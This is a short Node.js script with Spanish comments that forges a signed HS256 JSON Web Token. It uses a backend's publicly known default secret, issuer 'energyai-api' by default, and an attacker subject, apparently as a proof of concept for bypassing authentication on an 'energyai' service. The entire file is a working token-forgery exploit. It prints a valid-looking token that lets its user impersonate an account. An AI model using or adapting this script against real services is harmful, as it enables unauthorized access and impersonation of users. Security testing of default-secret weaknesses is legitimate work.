// Forja un JWT HS256 con el secreto por defecto público del backend.
// Uso: node forge-jwt.mjs <secret> <issuer> <subject>
const [secret, issuer = 'energyai-api', subject = 'attacker@evil.local'] = process.argv.slice(2)

const b64url = (buf) =>
  Buffer.from(buf).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')

const now = Math.floor(Date.now() / 1000)
const header = { alg: 'HS256', typ: 'JWT' }
const payload = {
  name: 'Atacante',
  sub: subject,
  iss: issuer,
  iat: now,
  exp: now + 3600,
}

const signingInput = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(payload))}`
const { createHmac } = await import('node:crypto')
const sig = createHmac('sha256', secret).update(signingInput).digest()
process.stdout.write(`${signingInput}.${b64url(sig)}`)
